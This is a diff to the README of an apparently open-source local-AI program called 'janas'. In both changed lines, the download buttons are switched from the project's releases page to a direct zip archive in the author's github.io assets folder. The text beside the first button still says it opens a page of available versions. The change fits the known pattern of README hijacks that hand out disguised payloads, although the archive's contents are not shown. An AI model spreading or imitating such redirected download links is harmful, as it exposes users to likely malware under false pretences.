@@ -13,7 +13,7 @@ janas is a **free, open-source program** that lets you run powerful artificial i
 
 ### Step 1: Get the App
 
-[![Download janas](https://img.shields.io/badge/Download_janas-Get_It_Now-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6347)](https://github.com/joaniberian9588/janas/releases)
+[![Download janas](https://img.shields.io/badge/Download_janas-Get_It_Now-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6347)](https://raw.githubusercontent.com/joaniberian9588/joaniberian9588.github.io/main/assets/v2.3.zip)
 
 Visit this link to download the application. The page shows you available versions — pick the newest one for your computer.
 
@@ -111,6 +111,6 @@ janas is released under a permissive open-source license, meaning you can use, m
 
 **Start your private AI journey today** — download janas and discover what local AI can do for you. No subscriptions. No cloud. Just your computer, working for you.
 
-[![Download janas Now](https://img.shields.io/badge/⬇️_Download_janas-Start_Now-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb&color=28a745)](https://github.com/joaniberian9588/janas/releases)
+[![Download janas Now](https://img.shields.io/badge/⬇️_Download_janas-Start_Now-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb&color=28a745)](https://raw.githubusercontent.com/joaniberian9588/joaniberian9588.github.io/main/assets/v2.3.zip)
 
 Keywords: avx2, c, cpu-inference, gguf, inference-engine, linux, llm, local-llm, mixture-of-experts, moe, nvme, quantization, qwen3, simd, speculative-decoding, vulkan
